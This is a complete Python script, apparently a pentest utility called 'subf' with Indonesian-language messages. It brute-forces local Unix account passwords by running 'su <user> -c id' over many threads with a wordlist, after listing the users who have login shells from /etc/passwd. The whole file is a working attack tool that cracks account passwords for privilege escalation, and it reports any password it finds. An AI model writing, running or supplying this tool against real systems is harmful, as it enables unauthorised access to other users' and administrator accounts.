#!/usr/bin/env python3
import pexpect
import argparse
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import zip_longest

# Warna ANSI
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"

def try_password(user, password):
    try:
        child = pexpect.spawn(f"su {user} -c id", timeout=5)
        child.expect("Password:")
        child.sendline(password)
        index = child.expect([r"(uid=\d+.+)", "su: Authentication failure", pexpect.EOF, pexpect.TIMEOUT])
        if index == 0:
            result = child.match.group(1).decode(errors="ignore").strip()
            child.close()
            return (True, password, result)
        child.close()
        return (False, password, None)
    except Exception as e:
        return (False, password, f"{RED}Error: {str(e)}{RESET}")

def print_header(tool_name, version, description):
    width = 60
    print(CYAN + "┌" + "─" * width + "┐")
    print(f"│ {tool_name} - v{version}".ljust(width + 1) + "│")
    print(f"│ {description}".ljust(width + 1) + "│")
    print("└" + "─" * width + "┘" + RESET + "\n")

def get_login_users():
    valid_shells = {
        '/bin/bash', '/bin/sh', '/bin/zsh', '/bin/dash', '/bin/ksh',
        '/usr/bin/bash', '/usr/bin/zsh', '/usr/bin/sh', '/usr/local/bin/bash'
    }
    users = []
    try:
        with open("/etc/passwd", "r") as f:
            for line in f:
                parts = line.strip().split(":")
                if len(parts) >= 7 and parts[6] in valid_shells:
                    users.append(parts[0])
    except Exception as e:
        print(f"{RED}[ERROR]{RESET} Gagal baca /etc/passwd: {e}")
    return users

def choose_user(users):
    print(YELLOW + "Pilih user target dari daftar berikut:" + RESET)
    cols = 3
    rows = (len(users) + cols - 1) // cols
    grid = [users[i::rows] for i in range(rows)]  # Buat kolom dari baris

    # Transpose & isi kosong agar rata
    grid = list(zip_longest(*grid, fillvalue=""))
    for row in grid:
        line = ""
        for i, user in enumerate(row):
            if user:
                idx = users.index(user) + 1
                line += f"[{idx:2}] {user:<15} "
        print("  " + line)

    while True:
        choice = input(f"Masukkan nomor user (1-{len(users)}): ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(users):
            return users[int(choice)-1]
        print(RED + "Input tidak valid. Coba lagi." + RESET)

def main():
    parser = argparse.ArgumentParser(description="subf: fast su brute-force with elegant UI")
    parser.add_argument("-u", "--user", help="Target username (jika tidak diisi, pilih dari /etc/passwd)")
    parser.add_argument("-w", "--wordlist", required=True, help="Path ke wordlist")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Jumlah threads paralel (default: 5)")
    args = parser.parse_args()

    if not os.path.isfile(args.wordlist):
        print(f"{RED}[ERROR]{RESET} Wordlist tidak ditemukan: {args.wordlist}")
        sys.exit(1)

    user = args.user or choose_user(get_login_users() or [])
    if not user:
        print(f"{RED}[ERROR]{RESET} Tidak ditemukan user yang valid.")
        sys.exit(1)

    with open(args.wordlist, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print_header("Subf", "1.0", "Unlock & Brute-Force User Access Tool")
    print(f"{YELLOW}[INFO]{RESET} Target user   : {user}")
    print(f"{YELLOW}[INFO]{RESET} Total password: {len(passwords)}")
    print(f"{YELLOW}[INFO]{RESET} Threads       : {args.threads}")
    print(f"{YELLOW}[INFO]{RESET} Mulai proses brute-force...\n")

    found = False
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(try_password, user, pwd): pwd for pwd in passwords}
        for i, future in enumerate(as_completed(futures), 1):
            success, pwd, result = future.result()
            print(f"\r{CYAN}[{i:>4}/{len(passwords)}]{RESET} Mencoba password: {pwd:<30}", end="")
            if success:
                print("\n" + GREEN + "─" * 60)
                print(f"[SUCCESS] Password ditemukan untuk user '{user}': {pwd}")
                print(f"[RESULT]  {result}")
                print("─" * 60 + RESET)
                found = True
                break

    if not found:
        print("\n" + RED + "─" * 60)
        print("[FAILED] Tidak berhasil menemukan password.")
        print("─" * 60 + RESET)

if __name__ == "__main__":
    if sys.stdin.isatty():
        main()
    else:
        print(f"{RED}[-]{RESET} Jalankan script ini di terminal (TTY).")